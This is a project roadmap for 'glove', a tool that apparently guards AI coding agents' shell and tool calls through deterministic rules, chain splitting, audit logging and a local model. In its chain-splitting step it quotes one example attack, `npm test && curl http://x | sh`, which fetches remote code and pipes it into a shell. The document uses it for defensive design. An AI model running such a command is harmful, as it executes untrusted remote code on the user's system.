# Roadmap

Status per release is in [`RELEASE.md`](RELEASE.md) (roll-up) and [`RELEASE/`](RELEASE/README.md) (detail). This file is the order and the reasons. Requirements live in [`PRD.md`](PRD.md) §7 (one shippable minor per step); decisions in [`docs/adr/`](docs/adr/).

## Release train (v0.1.0 to v1.0.0)

1. **0.1 Claude Code + Layer 0.** A working guard on one agent with deterministic rules only: hard-block / force-confirm / protected paths, `hook` + `check` + `install`, config diff + backup. The risky part first — the adapter contract (§5.1) and the frozen `contract.Verdict` (§5.3) must hold before anything smarter lands.
2. **0.2 Layer 1: chain splitting.** Shell-aware splitting (`&&`, `||`, `;`, `|`, `$(...)`), worst-part-wins across segments, `--explain`. This is where composition attacks (`npm test && curl http://x | sh`) stop working.
3. **0.3 Audit log.** Observability before intelligence: JSONL with rotation, redaction by default (zero plaintext leakage), query/export. Users see the Layer 0+1 false-positive rate in the wild before the model arrives.
4. **0.4 Layer 2: Laya + `serve`.** The flagship capability — semantic judgment for gray areas with calibrated confidence, four typed questions, and the "only ever tightens" invariant enforced in code (§4.2). **Load-bearing assumption to probe before building:** CPU inference of the ~644 MB GGUF must fit the `CGO_ENABLED=0` static-binary constraint (PRD §8) — typical llama.cpp bindings use cgo. Probe pure-Go GGUF runners vs. a bundled sidecar binary before writing `internal/server/laya_runtime.go`; record the outcome as ADR 3.
5. **0.5 Kilocode adapter.** Proves the adapter abstraction on a structurally different agent (TS shim, throw-to-block). Interface must be unchanged from 0.1.0.
6. **0.6 Codex + OpenCode.** Three primary agents covered; conformance suite (`internal/adapter/adapter_test.go` + `testdata/conformance/`) becomes the gate every new adapter must pass.
7. **0.7 Policy engine.** `policy.toml` with project > user > built-in precedence, `policy validate` with line numbers, `--fast` mode. Tuning arrives only after the deterministic layers are proven observable.
8. **0.8 Cursor, Gemini CLI, Zed.** Coverage matrix complete; Zed documented honestly as audit-only (no pre-tool hook surface); README matrix machine-verified by `glove list --matrix`.
9. **0.9 Release candidate.** No new features. Windows + cross-platform CI, signed binaries, performance gates in CI (hook ≤ 15ms, serve P95 ≤ 150ms), security review, failure-modes doc, 24h soak.
10. **1.0 Stability marker.** Version bump only. Freezes `contract.Verdict`, CLI surface, `policy.toml` schema, audit JSONL schema. Consolidated `CHANGELOG.md` generated from `RELEASE.md` §4.

Not scheduled: any new agent beyond the eight declared; remote/cloud anything (PRD §3.3 non-goal); prompt-level guardrails (only `tool_name` + `tool_input` are ever evaluated).

## Guardrails (PRD §10.4, binding at every step)

- No Layer 2 code before 0.4.0; no audit before 0.3.0.
- No new adapter without extending the conformance suite.
- No `contract.Verdict` field change without a documented schema-version bump and owner sign-off.
- No PR merges an install that doesn't show a config diff.
- Start at 0.1.0 only; do not proceed past its acceptance criteria until all boxes in PRD §10.5 are checked.

## Platform: what glove depends on

| Dependency | State | glove action |
|---|---|---|
| Go toolchain | **1.27.3** (go.mod, CI `GO_VERSION`, Dockerfile builder) | `CGO_ENABLED=0`, `-trimpath`, version via `-X`; NFR binary budget ≤ 15 MB stripped |
| `spf13/cobra` v1.10.2 | stable | CLI; locked in `RELEASE.md` §1 |
| Laya multilingual GGUF (~644 MB) | to verify at 0.4.0 | downloaded once at first `serve`, SHA-256 from release metadata, `--model-path` for airgapped; **cgo conflict flagged above** |
| HTTP layer for `serve` (0.4.0) | stdlib `net/http` first | one internal endpoint (`POST /evaluate`); chi only if middleware needs demand it (ADR 2 scope note) |
| Agent hook surfaces (§11) | move | each adapter re-verifies its agent's docs during that version's implementation; a protocol change touches one file |
| CI scanners | semgrep (vendored rules), govulncheck, trivy | `.semgrep/rules.yaml` extends; never re-add registry packs |
